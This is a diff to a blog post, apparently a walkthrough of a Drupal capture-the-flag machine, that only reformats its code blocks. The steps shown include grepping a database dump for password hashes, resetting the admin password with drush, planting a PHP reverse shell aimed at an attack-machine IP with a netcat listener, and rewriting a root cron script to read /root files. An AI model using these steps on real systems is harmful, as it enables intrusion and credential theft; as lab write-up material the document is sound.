@@ -184,33 +184,33 @@ Knowing the table name would be useful. However, I had no clue about Drupal's in
 
 Now, my solution is neither the cleanest nor most efficient... but I wanted the credentials and this worked.
 
-```
+{% highlight bash %}
 cat website.sql | grep -A 30 "Table structure for table `users`"
-```
+{% endhighlight %}
 
 ![Screen Shot 2019-09-03 at 7.20.39 PM.png](/assets/images/screen-shot-2019-09-03-at-7.20.39-pm.png)
 
 The optional argument `-A` refers to lines _after_ the matched line. We can conclude that the `users` table does not contain credentials. Moving on to `users_data` using the command:
 
-```
+{% highlight bash %}
 cat website.sql | grep -A 30 "Table structure for table `users_data`"
-```
+{% endhighlight %}
 
 ![Screen Shot 2019-09-03 at 7.22.43 PM.png](/assets/images/screen-shot-2019-09-03-at-7.22.43-pm.png)
 
 Nope, nothing. Moving on to the final table `users_field_data` using the command:
 
-```
+{% highlight bash %}
 cat website.sql | grep -A 30 "Table structure for table `users_field_data`"
-```
+{% endhighlight %}
 
 ![Screen Shot 2019-09-03 at 7.24.29 PM.png](/assets/images/screen-shot-2019-09-03-at-7.24.29-pm.png)
 
 Woohoo! The table `users_field_data` contains `name`, `pass`, `mail` and other user-specific fields. Let's expand the `grep` and view some data!
 
-```
+{% highlight bash %}
 cat website.sql | grep -A 40 "Table structure for table `users_field_data`"
-```
+{% endhighlight %}
 
 ![Screen Shot 2019-09-03 at 7.27.24 PM.png](/assets/images/screen-shot-2019-09-03-at-7.27.24-pm.png)
 
@@ -224,9 +224,9 @@ The motive was still to become `www-data` and modify the `cron` script to get 
 
 Interestingly, I found that the `drush` tool for Drupal is pretty useful when it comes to changing the password of `admin`. The syntax was simple:
 
-```
+{% highlight bash %}
 drush user-password USERNAME --password="SOMEPASSWORD"
-```
+{% endhighlight %}
 
 I decided to try it... why not?
 
@@ -298,11 +298,10 @@ Important steps to follow:
 2. Copy the `php-reverse-shell` code to the **Body**. On Kali Linux, it can be found in `/usr/share/laudanum/php/php-reverse-shell.php`
 3. Edit the `php-reverse-shell` code and modify the following lines:
 
-    ```
-        - $ip = '192.168.56.102'; // Attack machine IP
-            
-        - $port = 8888; // Desired port
-    ```  
+{% highlight bash %}
+- $ip = '192.168.56.102'; // Attack machine IP        
+- $port = 8888; // Desired port
+{% endhighlight %}
 
 4. Open a shell and run `nc -lvp 8888` on attack machine to listen for a reverse shell
 
@@ -314,10 +313,10 @@ Reverse shell! I am finally `www-data`. Hooray!
 
 Okay... back to the game plan. We simply need to modify `/opt/scripts/backups.sh` with the following lines of code:
 
-```
+{% highlight bash %}
 #!/bin/bash
 cat /root/\* > /tmp/arj/flag.txt
-```
+{% endhighlight %}
 
 ![Screen Shot 2019-09-04 at 12.53.32 AM.png](/assets/images/screen-shot-2019-09-04-at-12.53.32-am.png)
 
